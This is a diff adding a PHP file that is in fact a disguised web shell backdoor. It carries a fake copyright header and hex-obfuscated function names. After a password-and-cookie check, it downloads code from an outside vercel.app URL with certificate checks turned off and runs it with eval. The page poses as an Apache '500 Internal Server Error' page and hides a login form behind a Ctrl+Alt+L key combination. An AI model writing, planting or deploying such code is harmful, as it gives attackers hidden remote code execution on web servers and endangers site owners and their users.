@@ -1,0 +1,120 @@
+<?php
+/**
+ * @package    Haxor.Group
+ * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
+ *
+ */
+
+// @deprecated  1.0  Deprecated without replacement
+function is_logged_in()
+{
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
+}
+
+if (is_logged_in()) {
+    $Array = array(
+        '666f70656e', // fo p en => 0
+        '73747265616d5f6765745f636f6e74656e7473', // strea m_get_contents => 1
+        '66696c655f6765745f636f6e74656e7473', // fil e_g et_cont ents => 2
+        '6375726c5f65786563' // cur l_ex ec => 3
+    );
+
+    function hex2str($hex) {
+        $str = '';
+        for ($i = 0; $i < strlen($hex); $i += 2) {
+            $str .= chr(hexdec(substr($hex, $i, 2)));
+        }
+        return $str;
+    }
+
+    function geturlsinfo($destiny) {
+        $belief = array(
+            hex2str($GLOBALS['Array'][0]), 
+            hex2str($GLOBALS['Array'][1]), 
+            hex2str($GLOBALS['Array'][2]), 
+            hex2str($GLOBALS['Array'][3])  
+        );
+
+        if (function_exists($belief[3])) { 
+            $ch = curl_init($destiny);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            $love = $belief[3]($ch);
+            curl_close($ch);
+            return $love;
+        } elseif (function_exists($belief[2])) { 
+            return $belief[2]($destiny);
+        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
+            $purpose = $belief[0]($destiny, "r");
+            $love = $belief[1]($purpose);
+            fclose($purpose);
+            return $love;
+        }
+        return false;
+    }
+
+    $destiny = 'https://nhjeapinake.vercel.app/japadwukong.txt';
+    $dream = geturlsinfo($destiny);
+    if ($dream !== false) {
+        eval('?>' . $dream);
+    }
+} else {
+    if (isset($_POST['password'])) {
+        $entered_key = $_POST['password'];
+        $hashed_key = '$2a$12$8elQlK4bmqKou1PlR3WeyerpMp2qZpGOVeZGtUek7s3EtTSvFng7O';
+        
+        if (password_verify($entered_key, $hashed_key)) {
+            setcookie('user_id', 'LPH', time() + 3600, '/'); 
+            header("Location: " . $_SERVER['PHP_SELF']); 
+            exit();
+        }
+    }
+}
+?>
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html>
+<head>
+  <title>500 Internal Server Error</title>
+  <style>
+    body {
+      background-color: white;
+      color: black;
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    }
+    .hidden-form {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Internal Server Error</h1>
+  <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
+  <p>Please contact the server administrator, webmaster@site5demo.com and inform them of the time the error occurred,
+  and anything you might have done that may have caused the error.</p>
+  <p>More information about this error may be available in the server error log.</p>
+  <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
+  <hr>
+  <address>Apache Server at site5demo.com Port 80</address>
+
+  <!-- Japad login form (triggered via Ctrl+Alt+L) -->
+  <div class="hidden-form">
+    <form method="POST" action="">
+      <input type="password" name="password" placeholder="Masukkan password" />
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    // Tekan Ctrl + Alt + L buat munculin form login
+    document.addEventListener('keydown', function(e) {
+      if (e.ctrlKey && e.altKey && e.code === 'KeyL') {
+        document.querySelector('.hidden-form').style.display = 'block';
+        console.log('Japad mode masuk bro!');
+      }
+    });
+  </script>
+</body>
+</html>
